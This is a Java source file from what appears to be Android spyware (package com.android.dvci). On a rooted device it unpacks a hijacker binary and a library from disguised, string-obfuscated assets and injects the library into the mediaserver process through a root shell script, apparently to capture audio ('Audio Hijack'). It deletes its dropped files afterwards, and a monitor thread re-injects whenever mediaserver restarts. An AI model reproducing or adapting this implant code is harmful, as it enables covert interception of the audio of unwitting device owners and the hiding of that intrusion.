package com.android.dvci.util;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;




import com.android.dvci.Beep;
import com.android.dvci.Root;
import com.android.dvci.Status;
import com.android.dvci.auto.Cfg;
import com.android.dvci.capabilities.PackageInfo;
import com.android.dvci.conf.Configuration;
import com.android.dvci.evidence.EvidenceBuilder;
import com.android.dvci.file.AutoFile;
import com.android.dvci.file.Directory;

import com.android.mm.M;

public class Instrument {
	private static final String TAG = "Instrument";
	private static final int MAX_KILLED = 3;
	private String proc;
	private MediaserverMonitor pidMonitor;
	private static String lib, hijacker, path, dumpPath, pidCompletePath, pidFile;
	private boolean stopMonitor = false;

	private Thread monitor;
	private int killed = 0;

	public Instrument(String process, String dump) {
		final File filesPath = Status.getAppContext().getFilesDir();

		proc = process;

		hijacker = "m";
		lib = "n";
		path = filesPath.getAbsolutePath();
		dumpPath = dump;
		pidFile = M.e("irg");
		pidCompletePath = path + "/" + pidFile;
	}

	private boolean deleteHijacker() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (installHijacker) delete lib");
		}
		AutoFile file = new AutoFile(Status.getAppContext().getFilesDir(), lib);
		file.delete();
		file = new AutoFile(Status.getAppContext().getFilesDir(), hijacker);
		file.delete();
		return true;
	}

	private boolean installHijacker() {
		InputStream stream = Utils.getAssetStream(M.e("ib.data")); // libt.so
		if (Cfg.DEBUG) { Check.asserts(stream!=null, " (installHijacker) Assert failed"); }

		try {
			if (PackageInfo.checkRoot() == false) {
				if (Cfg.DEBUG) {
					Check.log(TAG + "(installHijacker): Nope, we are not root");
				}

				return false;
			}

			// Install library
			Root.fileWrite(lib, stream, Cfg.RNDDB);
			Execute.execute(Configuration.shellFile + " " + M.e("pzm 666 ") + path + "/" + lib);

			// copy_remount libt.so to /system/lib/
			// Execute.execute(Configuration.shellFile + " " + "fhs" + " " +
			// "/system" + " " + path + "/" + lib + " " + "/system/lib/" + lib);

			stream.close();

			// Unpack the Hijacker
			stream = Utils.getAssetStream(M.e("mb.data")); // Hijacker

			Root.fileWrite(hijacker, stream, Cfg.RNDDB);

			Runtime.getRuntime().exec(Configuration.shellFile + " " + M.e("pzm 750 ") + path + "/" + hijacker);

			stream.close();
		} catch (Exception e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			return false;
		}

		return true;
	}

	public boolean startInstrumentation() {
		if (PackageInfo.checkRoot() == false) {
			if (Cfg.DEBUG) {
				Check.log(TAG + "(startInstrumentation): Nope, we are not root");
			}

			return false;
		}

		if (!installHijacker()) {
			return false;
		}

		try {
			int pid = getProcessPid();

			if (pid > 0) {
				// Run the injector
				String scriptName = "ij";
				String script = M.e("#!/system/bin/sh") + "\n";
				if (Cfg.DEBUG) {
					script += path + "/" + hijacker + " -p " + pid + " -l " + path + "/" + lib + " -f " + dumpPath + " -d\n";
					Check.log(TAG + " (startInstrumentation) running: " + path + "/" + hijacker + " -p " + pid + " -l " + path + "/" + lib + " -f " + dumpPath + " -d\n");
				}else{
					script += path + "/" + hijacker + " -p " + pid + " -l " + path + "/" + lib + " -f " + dumpPath + "\n";
				}

				Root.createScript(scriptName, script);
				ExecuteResult ret = Execute.executeRoot(path + "/" + scriptName);
				if (Cfg.DEBUG) {
					Check.log(TAG + " (startInstrumentation) exit code: " + ret.exitCode);
				}

				Root.removeScript(scriptName);

				Utils.sleep(2000);
				int newpid = getProcessPid();
				if (newpid != pid) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (startInstrumentation) Error: mediaserver was killed");
					}
				}

				File d = new File(dumpPath);

				boolean started = false;

				for (int i = 0; i < 5 && !started; i++) {
					File[] files = d.listFiles();
					for (File file : files) {
						if (file.getName().endsWith(M.e(".cnf"))) {
							if (Cfg.DEBUG) {
								Check.log(TAG + " (startInstrumentation) got file: " + file.getName());
							}
							started = true;
							file.delete();
							
							if(Cfg.DEMO){
								Beep.beep();
								Beep.bip();
							}
						}

					}
					if (!started) {
						if (Cfg.DEBUG) {
							Check.log(TAG + " (startInstrumentation) sleep 5 secs");
						}
						Utils.sleep(2000);
					}
				}

				if (!started && killed < MAX_KILLED) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (startInstrumentation) Kill mediaserver");
					}
					killProc();
					// Utils.sleep(1000);
					// newpid = getProcessPid();
					killed += 1;

					if (started && Cfg.DEBUG) {
						Check.log(TAG + " (startInstrumentation) Audio Hijack installed");
						EvidenceBuilder.info("Audio Hijack");
					}

					stopMonitor = false;
				}

				if (pidMonitor == null) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (startInstrumentation) script: \n" + script);
						Check.log(TAG + "(startInstrumentation): Starting MeadiaserverMonitor thread");
					}

					pidMonitor = new MediaserverMonitor(newpid);
					monitor = new Thread(pidMonitor);
					monitor.start();
				} else {
					pidMonitor.setPid(newpid);
				}
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + "(getProcessPid): unable to get pid");
				}

			}
		} catch (Exception e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (startInstrumentation) Error: " + e);
			}
			return false;
		} finally {
			deleteHijacker();
		}

		return true;
	}

	public void stopInstrumentation() {
		stopMonitor = true;
		monitor = null;
	}

	private int getProcessPid() {
		int pid;
		byte[] buf = new byte[4];
		if (Cfg.DEBUG) {
			Check.log(TAG + " (getProcessPid) " + proc + " " + pidCompletePath);
		}
		Execute.execute(Configuration.shellFile + " " + M.e("lid") + " " + proc + " " + pidCompletePath);

		try {
			FileInputStream fis = Status.getAppContext().openFileInput(pidFile);

			fis.read(buf);
			fis.close();

			// Remove PID file
			File f = new File(pidCompletePath);
			f.delete();

			// Parse PID from the file
			ByteBuffer bbuf = ByteBuffer.wrap(buf);
			bbuf.order(ByteOrder.LITTLE_ENDIAN);
			pid = bbuf.getInt();
		} catch (IOException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			return 0;
		}

		return pid;
	}

	public void killProc() {
		try {
			int pid = getProcessPid();
			if (Cfg.DEBUG) {
				Check.log(TAG + " (killProc) try to kill " + pid);
			}
			Execute.executeRoot("kill " + pid);
		} catch (Exception ex) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (killProc) Error: " + ex);
			}
		}
	}

	class MediaserverMonitor implements Runnable {
		private int cur_pid, start_pid;
		private int failedCounter = 0;

		public void setPid(int pid) {
			start_pid = pid;
		}

		public MediaserverMonitor(int pid) {
			if (Cfg.DEBUG) {
				Check.log(TAG + "(MediaserverMonitor): starting with pid " + pid);
			}

			setPid(pid);
		}

		@Override
		public void run() {
			while (true) {
				
				if (stopMonitor) {
					if (Cfg.DEBUG) {
						Check.log(TAG + "(MediaserverMonitor run): closing monitor thread");
					}

					stopMonitor = false;
					return;
				}

				cur_pid = getProcessPid();

				// Mediaserver died
				if (cur_pid != start_pid) {
					if (Cfg.DEBUG) {
						Check.log(TAG + "(MediaserverMonitor run): Mediaserver died, restarting instrumentation");
					}

					failedCounter += 1;
					if (failedCounter < 3) {
						startInstrumentation();
					} else {
						if (Cfg.DEBUG) {
							Check.log(TAG + " (run) too many retry, sto restart mediaserver");
						}
					}
				} else {
					failedCounter = 0;
				}
				
				Utils.sleep(10000);
			}
		}
	}
}
